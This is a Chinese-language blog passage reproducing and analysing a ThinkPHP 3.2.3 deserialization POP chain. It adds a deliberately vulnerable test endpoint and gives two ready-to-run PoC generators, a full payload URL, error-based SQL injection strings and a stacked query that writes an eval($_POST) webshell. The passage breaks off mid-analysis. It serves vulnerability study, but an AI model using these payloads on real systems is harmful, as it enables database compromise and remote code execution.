title="Phar反序列化原理以及特征"></a>Phar反序列化原理以及特征</h3><p>phar://伪协议会在多个函数中反序列化其metadata部分<br>受影响的函数包括不限于如下:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">copy<span class="token punctuation">,</span>file_exists<span class="token punctuation">,</span>file_get_contents<span class="token punctuation">,</span>file_put_contents<span class="token punctuation">,</span>file<span class="token punctuation">,</span>fileatime<span class="token punctuation">,</span>filectime<span class="token punctuation">,</span>filegroup<span class="token punctuation">,</span>fileinode<span class="token punctuation">,</span>filemtime<span class="token punctuation">,</span>fileowner<span class="token punctuation">,</span>fileperms<span class="token punctuation">,</span>fopen<span class="token punctuation">,</span>is_dir<span class="token punctuation">,</span>is_executable<span class="token punctuation">,</span>is_file<span class="token punctuation">,</span>is_link<span class="token punctuation">,</span>is_readable<span class="token punctuation">,</span>is_writable<span class="token punctuation">,</span>is_writeable<span class="token punctuation">,</span>parse_ini_file<span class="token punctuation">,</span>readfile<span class="token punctuation">,</span>stat<span class="token punctuation">,</span>unlink<span class="token punctuation">,</span>exif_thumbnailexif_imagetype<span class="token punctuation">,</span>imageloadfontimagecreatefrom<span class="token punctuation">,</span>hash_hmac_filehash_filehash_update_filemd5_filesha1_file<span class="token punctuation">,</span>get_meta_tagsget_headers<span class="token punctuation">,</span>getimagesizegetimagesizefromstring<span class="token punctuation">,</span>extractTo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li>PHPstudy</li></ul><ul><li>PHP: <code>5.6.9nts</code></li><li>ThinkPHP: <code>3.2.3</code></li></ul><p>Index控制器添加test方法,实现一个可控的反序列化的点</p><p>路径： /Application/Home/Controller/IndexController.class.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;style type="text/css"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;thinkad id="ad_55e75dfae343f5a1"&gt;&lt;/thinkad&gt;&lt;script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"&gt;&lt;/script&gt;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>通过pop 链构造，可实现<code>报错注入</code>和<code>MySQL恶意服务端读取客户端文件</code></p><p>因为PDO默认是支持多语句查询的，所以这个点是可以堆叠注入的，可以尝试写shell</p><h2 id="pop-链构造"><a href="#pop-链构造" class="headerlink" title="pop 链构造"></a>pop 链构造</h2><p>最终利用链</p><pre class="line-numbers language-none"><code class="language-none">__destruct()-&gt;destroy()-&gt;delete()-&gt;Driver::delete()-&gt;Driver::execute()-&gt;Driver::initConnect()-&gt;Driver::connect()-&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>poc1</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//初始化数据库连接</span><span class="token keyword">namespace</span> <span class="token package">Think<span class="token punctuation">\</span>Db<span class="token punctuation">\</span>Driver</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">PDO</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Mysql</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">MYSQL_ATTR_LOCAL_INFILE</span> <span class="token operator">=&gt;</span> <span class="token constant boolean">true</span>    <span class="token comment">// 开启才能读取文件</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string double-quoted-string">"debug"</span> <span class="token operator">=&gt;</span> <span class="token number">1</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"database"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"thinkphp"</span><span class="token punctuation">,</span>    <span class="token comment">//数据库名</span>            <span class="token string double-quoted-string">"hostname"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">,</span>    <span class="token comment">//地址</span>            <span class="token string double-quoted-string">"hostport"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"3306"</span><span class="token punctuation">,</span>    <span class="token comment">//端口</span>            <span class="token string double-quoted-string">"charset"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"utf8"</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"username"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span>    <span class="token comment">//用户名</span>            <span class="token string double-quoted-string">"password"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"root"</span>    <span class="token comment">//密码</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Think<span class="token punctuation">\</span>Image<span class="token punctuation">\</span>Driver</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Session<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Memcache</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Imagick</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$img</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">img</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Think<span class="token punctuation">\</span>Session<span class="token punctuation">\</span>Driver</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Memcache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Model</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Think</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Db<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Mysql</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Model</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$pk</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mysql</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pk</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'id'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pk</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>                <span class="token string double-quoted-string">"where"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">" "</span> <span class="token comment">// where不能为空</span>                <span class="token string double-quoted-string">"table"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"mysql.users where 1=updatexml(1,user(),1)#"</span><span class="token punctuation">,</span>                <span class="token comment">// 写shell</span><span class="token comment">// "table"=&gt;"mysql.user where 1=2;select \"&lt;?php eval(\$_POST[0]);</span><span class="token delimiter important">?&gt;</span></span>\" into outfile \"D:\\\\phpstudy_pro\\\\WWW\\\\1.php\"#",            );        }    }}namespace {    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="http://192.168.1.8/index.php?m=Home&amp;c=Index&amp;a=test&amp;x=TzoyNjoiVGhpbmtcSW1hZ2VcRHJpdmVyXEltYWdpY2siOjE6e3M6MzE6IgBUaGlua1xJbWFnZVxEcml2ZXJcSW1hZ2ljawBpbWciO086Mjk6IlRoaW5rXFNlc3Npb25cRHJpdmVyXE1lbWNhY2hlIjoxOntzOjk6IgAqAGhhbmRsZSI7TzoxMToiVGhpbmtcTW9kZWwiOjQ6e3M6MTA6IgAqAG9wdGlvbnMiO2E6MTp7czo1OiJ3aGVyZSI7czowOiIiO31zOjU6IgAqAHBrIjtzOjI6ImlkIjtzOjc6IgAqAGRhdGEiO2E6MTp7czoyOiJpZCI7YToyOntzOjU6InRhYmxlIjtzOjk5OiJteXNxbC51c2VyIHdoZXJlIDE9MjtzZWxlY3QgIjw/cGhwIGV2YWwoJF9QT1NUWzBdKTs/PiIgaW50byBvdXRmaWxlICJEOlxccGhwc3R1ZHlfcHJvXFxXV1dcXDEucGhwIiMiO3M6NToid2hlcmUiO3M6MToiICI7fX1zOjU6IgAqAGRiIjtPOjIxOiJUaGlua1xEYlxEcml2ZXJcTXlzcWwiOjI6e3M6MTA6IgAqAG9wdGlvbnMiO2E6MTp7aToxMDAxO2I6MTt9czo5OiIAKgBjb25maWciO2E6Nzp7czo1OiJkZWJ1ZyI7aToxO3M6ODoiZGF0YWJhc2UiO3M6ODoidGhpbmtwaHAiO3M6ODoiaG9zdG5hbWUiO3M6OToiMTI3LjAuMC4xIjtzOjg6Imhvc3Rwb3J0IjtzOjQ6IjMzMDYiO3M6NzoiY2hhcnNldCI7czo0OiJ1dGY4IjtzOjg6InVzZXJuYW1lIjtzOjQ6InJvb3QiO3M6ODoicGFzc3dvcmQiO3M6NDoicm9vdCI7fX19fX0=">http://192.168.1.8/index.php?m=Home&amp;c=Index&amp;a=test&amp;x=TzoyNjoiVGhpbmtcSW1hZ2VcRHJpdmVyXEltYWdpY2siOjE6e3M6MzE6IgBUaGlua1xJbWFnZVxEcml2ZXJcSW1hZ2ljawBpbWciO086Mjk6IlRoaW5rXFNlc3Npb25cRHJpdmVyXE1lbWNhY2hlIjoxOntzOjk6IgAqAGhhbmRsZSI7TzoxMToiVGhpbmtcTW9kZWwiOjQ6e3M6MTA6IgAqAG9wdGlvbnMiO2E6MTp7czo1OiJ3aGVyZSI7czowOiIiO31zOjU6IgAqAHBrIjtzOjI6ImlkIjtzOjc6IgAqAGRhdGEiO2E6MTp7czoyOiJpZCI7YToyOntzOjU6InRhYmxlIjtzOjk5OiJteXNxbC51c2VyIHdoZXJlIDE9MjtzZWxlY3QgIjw/cGhwIGV2YWwoJF9QT1NUWzBdKTs/PiIgaW50byBvdXRmaWxlICJEOlxccGhwc3R1ZHlfcHJvXFxXV1dcXDEucGhwIiMiO3M6NToid2hlcmUiO3M6MToiICI7fX1zOjU6IgAqAGRiIjtPOjIxOiJUaGlua1xEYlxEcml2ZXJcTXlzcWwiOjI6e3M6MTA6IgAqAG9wdGlvbnMiO2E6MTp7aToxMDAxO2I6MTt9czo5OiIAKgBjb25maWciO2E6Nzp7czo1OiJkZWJ1ZyI7aToxO3M6ODoiZGF0YWJhc2UiO3M6ODoidGhpbmtwaHAiO3M6ODoiaG9zdG5hbWUiO3M6OToiMTI3LjAuMC4xIjtzOjg6Imhvc3Rwb3J0IjtzOjQ6IjMzMDYiO3M6NzoiY2hhcnNldCI7czo0OiJ1dGY4IjtzOjg6InVzZXJuYW1lIjtzOjQ6InJvb3QiO3M6ODoicGFzc3dvcmQiO3M6NDoicm9vdCI7fX19fX0=</a></p><p>poc2</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Think<span class="token punctuation">\</span>Image<span class="token punctuation">\</span>Driver</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Session<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Memcache</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Imagick</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$img</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">img</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Think<span class="token punctuation">\</span>Session<span class="token punctuation">\</span>Driver</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Memcache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Model</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Think</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Db<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Mysql</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Model</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$pk</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$db</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pk</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'id'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pk</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>                <span class="token string single-quoted-string">'where'</span><span class="token operator">=&gt;</span><span class="token string single-quoted-string">'1=1'</span><span class="token punctuation">,</span>                <span class="token string single-quoted-string">'table'</span><span class="token operator">=&gt;</span><span class="token string single-quoted-string">'mysql.users where 1=updatexml(1,concat(0x7e,database(),0x7e),1)#'</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mysql</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Think<span class="token punctuation">\</span>Db<span class="token punctuation">\</span>Driver</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">PDO</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Mysql</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$config</span>     <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string single-quoted-string">'type'</span>              <span class="token operator">=&gt;</span>  <span class="token string single-quoted-string">'mysql'</span><span class="token punctuation">,</span>     <span class="token comment">// 数据库类型</span>            <span class="token string single-quoted-string">'hostname'</span>          <span class="token operator">=&gt;</span>  <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token comment">// 服务器地址</span>            <span class="token string single-quoted-string">'database'</span>          <span class="token operator">=&gt;</span>  <span class="token string single-quoted-string">'thinkphp'</span><span class="token punctuation">,</span>          <span class="token comment">// 数据库名</span>            <span class="token string single-quoted-string">'username'</span>          <span class="token operator">=&gt;</span>  <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span>      <span class="token comment">// 用户名</span>            <span class="token string single-quoted-string">'password'</span>          <span class="token operator">=&gt;</span>  <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span>          <span class="token comment">// 密码</span>            <span class="token string single-quoted-string">'hostport'</span>          <span class="token operator">=&gt;</span>  <span class="token string single-quoted-string">'3306'</span><span class="token punctuation">,</span>        <span class="token comment">// 端口</span>            <span class="token string single-quoted-string">'dsn'</span>               <span class="token operator">=&gt;</span>  <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token comment">//</span>            <span class="token string single-quoted-string">'params'</span>            <span class="token operator">=&gt;</span>  <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 数据库连接参数</span>            <span class="token string single-quoted-string">'charset'</span>           <span class="token operator">=&gt;</span>  <span class="token string single-quoted-string">'utf8'</span><span class="token punctuation">,</span>      <span class="token comment">// 数据库编码默认采用utf8</span>            <span class="token string single-quoted-string">'prefix'</span>            <span class="token operator">=&gt;</span>  <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>    <span class="token comment">// 数据库表前缀</span>            <span class="token string single-quoted-string">'debug'</span>             <span class="token operator">=&gt;</span>  <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token comment">// 数据库调试模式</span>            <span class="token string single-quoted-string">'deploy'</span>            <span class="token operator">=&gt;</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment">// 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)</span>            <span class="token string single-quoted-string">'rw_separate'</span>       <span class="token operator">=&gt;</span>  <span class="token constant boolean">false</span><span class="token punctuation">,</span>       <span class="token comment">// 数据库读写是否分离 主从式有效</span>            <span class="token string single-quoted-string">'master_num'</span>        <span class="token operator">=&gt;</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token comment">// 读写分离后 主服务器数量</span>            <span class="token string single-quoted-string">'slave_no'</span>          <span class="token operator">=&gt;</span>  <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token comment">// 指定从服务器序号</span>            <span class="token string single-quoted-string">'db_like_fields'</span>    <span class="token operator">=&gt;</span>  <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_CASE</span>              <span class="token operator">=&gt;</span>  <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">CASE_LOWER</span><span class="token punctuation">,</span>            <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_ERRMODE</span>           <span class="token operator">=&gt;</span>  <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ERRMODE_EXCEPTION</span><span class="token punctuation">,</span>            <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_ORACLE_NULLS</span>      <span class="token operator">=&gt;</span>  <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">NULL_NATURAL</span><span class="token punctuation">,</span>            <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_STRINGIFY_FETCHES</span> <span class="token operator">=&gt;</span>  <span class="token constant boolean">false</span><span class="token punctuation">,</span>            <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">MYSQL_ATTR_LOCAL_INFILE</span> <span class="token operator">=&gt;</span> <span class="token constant boolean">true</span><span class="token punctuation">,</span>    <span class="token comment">//读取本地文件</span>            <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">MYSQL_ATTR_MULTI_STATEMENTS</span> <span class="token operator">=&gt;</span> <span class="token constant boolean">true</span><span class="token punctuation">,</span>    <span class="token comment">//把堆叠开了</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Think<span class="token punctuation">\</span>Image<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Imagick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>先从<code>__destruct</code>方法入手，全局搜索</p><p>路径：<code>ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * 析构方法，用于销毁图像资源 */</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">img</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">img</span><span class="token operator">-&gt;</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数<code>$this-&gt;img</code> 是本类中<code>$img</code>这个成员变量，是完全可控的，并且调用了<code>$this-&gt;img</code>的destroy()，</p><p>全局搜索<code>destroy</code>方法, 来寻找一个含有destroy()成员方法的跳板类，跟进</p><p>路径：<code>ThinkPHP/Library/Think/Session/Driver/Memcache.class.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">   <span class="token comment">/**    * 删除Session     * @access public     * @param string $sessID     */</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token variable">$sessID</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">handle</span><span class="token operator">-&gt;</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">sessionName</span><span class="token operator">.</span><span class="token variable">$sessID</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$this-&gt;handle</code>，<code>$this-&gt;sessionName</code>参数可控</p><p>无参数调用函数在 php7 中会判错，但是 php5 不会，所以版本利用有限</p><p>跟进<code>delete</code>方法</p><p>路径：<code>ThinkPHP/Mode/Lite/Model.class.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token variable">$options</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token variable">$pk</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getPk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token 